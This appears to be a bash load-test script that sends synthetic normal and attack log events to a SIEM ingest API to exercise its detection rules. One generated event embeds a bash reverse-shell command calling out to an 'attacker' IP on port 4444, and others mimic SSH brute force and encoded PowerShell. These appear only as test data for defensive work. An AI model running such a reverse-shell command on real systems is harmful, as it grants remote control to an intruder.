#!/usr/bin/env bash
# Realistic 10K EPS load test with mixed normal + attack traffic
# Usage: ./scripts/loadtest-realistic.sh <API_URL> <API_KEY> [DURATION_SECS] [TARGET_EPS]
set -euo pipefail

API_URL="${1:-http://localhost:8080}"
API_KEY="${2:-}"
DURATION="${3:-60}"
TARGET_EPS="${4:-10000}"
TENANT="safebox"
BATCH_SIZE=500
CONCURRENCY=8

# Attack traffic ratio: 5% of events are attack patterns
ATTACK_RATIO=20  # 1 in 20 events is an attack

ATTACKER_IPS=("137.184.151.191" "185.208.159.193" "106.75.177.183" "104.43.56.65" "170.64.187.218" "45.33.32.156" "223.71.167.99" "91.240.118.172")
NORMAL_IPS=("192.168.56.218" "192.168.26.128" "10.10.0.1" "10.10.0.2" "192.168.1.100" "192.168.1.101")
HOSTNAMES=("OPNsense.internal" "dc01.safebox.local" "srv-file01" "UILI" "srv-mail01")
USERS=("admin" "root" "leandro" "soc-analyst" "backup-svc")

AUTH_HEADER=""
if [ -n "$API_KEY" ]; then
  AUTH_HEADER="-H \"X-Api-Key: $API_KEY\""
fi

echo "=== Realistic Load Test ==="
echo "API:        $API_URL"
echo "Duration:   ${DURATION}s"
echo "Target EPS: $TARGET_EPS"
echo "Batch size: $BATCH_SIZE"
echo "Concurrency: $CONCURRENCY"
echo "Attack ratio: 1 in $ATTACK_RATIO events"
echo ""

generate_normal_event() {
  local src_ip="${NORMAL_IPS[$((RANDOM % ${#NORMAL_IPS[@]}))]}"
  local hostname="${HOSTNAMES[$((RANDOM % ${#HOSTNAMES[@]}))]}"
  local r=$((RANDOM % 5))
  local ts
  ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)

  case $r in
    0) # OPNsense filterlog (pass, outbound)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"syslog\",\"event_time\":\"$ts\",\"raw_payload\":{\"app_name\":\"filterlog\",\"hostname\":\"OPNsense.internal\",\"source_ip\":\"192.168.56.218\",\"severity\":6,\"facility_name\":\"local0\",\"message\":\"$((RANDOM % 100)),,,tracker,xn0,match,pass,out,4,0x0,,64,$((RANDOM % 65535)),0,DF,6,tcp,60,$src_ip,${NORMAL_IPS[$((RANDOM % ${#NORMAL_IPS[@]}))]},${RANDOM},443,0,S,${RANDOM},,64240,,mss;sackOK\"}}"
      ;;
    1) # OPNsense cron
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"syslog\",\"event_time\":\"$ts\",\"raw_payload\":{\"app_name\":\"/usr/sbin/cron\",\"hostname\":\"OPNsense.internal\",\"source_ip\":\"192.168.56.218\",\"severity\":6,\"facility_name\":\"cron\",\"message\":\"(root) CMD ((/usr/local/bin/flock -n -E 0 -o /tmp/updaterrd.lock /usr/local/opnsense/scripts/health/updaterrd.php) > /dev/null)\"}}"
      ;;
    2) # Windows Sysmon process creation (normal)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"agent_forwarded\",\"event_time\":\"$ts\",\"raw_payload\":{\"event_type\":\"ProcessCreate\",\"hostname\":\"UILI\",\"Image\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\",\"CommandLine\":\"svchost.exe -k netsvcs\",\"User\":\"NT AUTHORITY\\\\SYSTEM\",\"ProcessId\":$((RANDOM % 10000))}}"
      ;;
    3) # DHCP
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"syslog\",\"event_time\":\"$ts\",\"raw_payload\":{\"app_name\":\"dhclient\",\"hostname\":\"OPNsense.internal\",\"source_ip\":\"192.168.56.218\",\"severity\":6,\"message\":\"DHCPACK from 192.168.32.1\"}}"
      ;;
    4) # DNS query (normal)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"agent_forwarded\",\"event_time\":\"$ts\",\"raw_payload\":{\"event_type\":\"DnsQuery\",\"hostname\":\"UILI\",\"QueryName\":\"www.google.com\",\"QueryResults\":\"142.250.80.4\",\"Image\":\"C:\\\\Windows\\\\System32\\\\svchost.exe\"}}"
      ;;
  esac
}

generate_attack_event() {
  local attacker_ip="${ATTACKER_IPS[$((RANDOM % ${#ATTACKER_IPS[@]}))]}"
  local ts
  ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  local r=$((RANDOM % 8))

  case $r in
    0) # SSH brute force (triggers opnsense_ssh_brute_force)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"syslog\",\"event_time\":\"$ts\",\"raw_payload\":{\"app_name\":\"audit\",\"hostname\":\"OPNsense.internal\",\"source_ip\":\"192.168.56.218\",\"severity\":4,\"facility_name\":\"auth\",\"message\":\"user root could not authenticate for sshd. [using OPNsense\\\\Auth\\\\Services\\\\System + OPNsense\\\\Auth\\\\Local]\"}}"
      ;;
    1) # Blocked SSH scanner (triggers opnsense_blocked_ssh_scanner)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"syslog\",\"event_time\":\"$ts\",\"raw_payload\":{\"app_name\":\"filterlog\",\"hostname\":\"OPNsense.internal\",\"source_ip\":\"192.168.56.218\",\"severity\":6,\"facility_name\":\"local0\",\"message\":\"51,,,tracker,xn0,match,block,in,4,0x0,,53,$((RANDOM % 65535)),0,DF,6,tcp,60,$attacker_ip,192.168.56.218,$((RANDOM % 65535)),22,0,S,$((RANDOM)),,64240,,mss;sackOK\"}}"
      ;;
    2) # Port scan (triggers opnsense_blocked_port_scan)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"syslog\",\"event_time\":\"$ts\",\"raw_payload\":{\"app_name\":\"filterlog\",\"hostname\":\"OPNsense.internal\",\"source_ip\":\"192.168.56.218\",\"severity\":6,\"facility_name\":\"local0\",\"message\":\"51,,,tracker,xn0,match,block,in,4,0x0,,53,$((RANDOM % 65535)),0,DF,6,tcp,60,$attacker_ip,192.168.56.218,$((RANDOM % 65535)),$((RANDOM % 1024)),0,S,$((RANDOM)),,64240,,mss\"}}"
      ;;
    3) # Suspicious PowerShell (triggers sysmon_suspicious_powershell)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"windows_sysmon\",\"event_time\":\"$ts\",\"raw_payload\":{\"event_type\":\"ProcessCreate\",\"hostname\":\"UILI\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"CommandLine\":\"powershell.exe -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0\",\"User\":\"SAFEBOX\\\\admin\",\"ProcessId\":$((RANDOM % 10000))}}"
      ;;
    4) # SSH auth timeout (triggers opnsense_ssh_auth_timeout)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"syslog\",\"event_time\":\"$ts\",\"raw_payload\":{\"app_name\":\"sshd\",\"hostname\":\"OPNsense.internal\",\"source_ip\":\"192.168.56.218\",\"severity\":4,\"facility_name\":\"auth\",\"message\":\"Timeout before authentication for connection from $attacker_ip to 192.168.56.218, pid = $((RANDOM % 99999))\"}}"
      ;;
    5) # SSH invalid banner (triggers opnsense_ssh_invalid_banner)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"syslog\",\"event_time\":\"$ts\",\"raw_payload\":{\"app_name\":\"sshd-session\",\"hostname\":\"OPNsense.internal\",\"source_ip\":\"192.168.56.218\",\"severity\":4,\"facility_name\":\"auth\",\"message\":\"banner exchange: Connection from $attacker_ip port $((RANDOM % 65535)): invalid format\"}}"
      ;;
    6) # IP lockout (triggers opnsense_ip_lockout)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"syslog\",\"event_time\":\"$ts\",\"raw_payload\":{\"app_name\":\"lockout_handler\",\"hostname\":\"OPNsense.internal\",\"source_ip\":\"192.168.56.218\",\"severity\":5,\"facility_name\":\"user\",\"message\":\"lockout $attacker_ip [using table sshlockout] after 6 attempts\"}}"
      ;;
    7) # Reverse shell attempt (triggers linux_reverse_shell)
      echo "{\"tenant_id\":\"$TENANT\",\"source\":\"syslog\",\"event_time\":\"$ts\",\"raw_payload\":{\"event_type\":\"ProcessCreate\",\"hostname\":\"srv-file01\",\"Image\":\"/bin/bash\",\"CommandLine\":\"bash -i >& /dev/tcp/$attacker_ip/4444 0>&1\",\"User\":\"www-data\"}}"
      ;;
  esac
}

# Build a batch of events
build_batch() {
  local events=""
  for ((i=0; i<BATCH_SIZE; i++)); do
    if [ $((RANDOM % ATTACK_RATIO)) -eq 0 ]; then
      event=$(generate_attack_event)
    else
      event=$(generate_normal_event)
    fi
    if [ -n "$events" ]; then
      events="$events,$event"
    else
      events="$event"
    fi
  done
  echo "{\"events\":[$events]}"
}

# Worker function
worker() {
  local worker_id=$1
  local end_time=$(($(date +%s) + DURATION))
  local count=0
  local errors=0

  while [ $(date +%s) -lt $end_time ]; do
    BATCH=$(build_batch)
    RESP=$(curl -s -w "\n%{http_code}" -X POST "$API_URL/api/v1/events:ingest" \
      -H "Content-Type: application/json" \
      -H "X-Api-Key: $API_KEY" \
      -d "$BATCH" 2>/dev/null || echo -e "\n000")
    HTTP_CODE=$(echo "$RESP" | tail -1)
    if [ "$HTTP_CODE" = "200" ]; then
      count=$((count + BATCH_SIZE))
    else
      errors=$((errors + 1))
    fi

    # Rate limit to target EPS / concurrency
    local per_worker_eps=$((TARGET_EPS / CONCURRENCY))
    local sleep_ms=$((BATCH_SIZE * 1000 / per_worker_eps))
    sleep "0.$(printf '%03d' $sleep_ms)" 2>/dev/null || true
  done

  echo "Worker $worker_id: $count events sent, $errors errors"
}

echo "Starting $CONCURRENCY workers for ${DURATION}s..."
echo ""

START_TIME=$(date +%s)

# Launch workers in parallel
for ((w=0; w<CONCURRENCY; w++)); do
  worker $w &
done

wait

END_TIME=$(date +%s)
ELAPSED=$((END_TIME - START_TIME))
echo ""
echo "=== Test Complete ==="
echo "Duration: ${ELAPSED}s"
echo "Check the SIEM for alerts and auto-created cases."
